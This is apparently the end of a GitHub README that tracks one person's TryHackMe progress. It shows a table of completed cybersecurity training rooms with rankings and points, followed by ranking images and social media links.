|18      |Easy 🔗 - Detecting Web DDos           | 500    |     106ᵗʰ    |      4ᵗʰ     |     312ⁿᵈ    |     4ᵗʰ    | 126,674  |    970    |    76     |
|17      |Medium 🔗 - DLL Hijacking              | 499    |     106ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     7ᵗʰ    | 126,554  |    969    |    75     |
|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ    |     7ᵗʰ    | 126,546  |    968    |    75     |
|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ    |     7ᵗʰ    | 126,538  |    967    |    74     |
|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ    |     7ᵗʰ    | 126,420  |    966    |    74     |
|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ    |     7ᵗʰ    | 126,420  |    965    |    74     |
|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     7ᵗʰ    | 126,404  |    964    |    74     |
|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ    |     6ᵗʰ    | 126,300  |    963    |    74     |
|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ    |     6ᵗʰ    | 126,270  |    963    |    74     |
|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ    |     6ᵗʰ    | 126,160  |    962    |    74     |
|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ    |     6ᵗʰ    | 126,120  |    961    |    73     |
|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ    |     6ᵗʰ    | 126,056  |    960    |    73     |
|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |    940    |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div>
<br>

<p align="center">Global All Time:   108ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/9bd7abf6-5d37-4dc4-ba91-eef6d03110ce"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/ca036c0b-0d46-49a6-86b7-65983531dc9d"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/40817842-b037-4ca5-b805-db75142a9bb9"><br>
                  Global monthly:    211ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/df4c3063-4676-42b9-b6fa-46aafa2c56fa"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/991ebd8e-2525-4c15-9486-4370fb2b1b8a"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
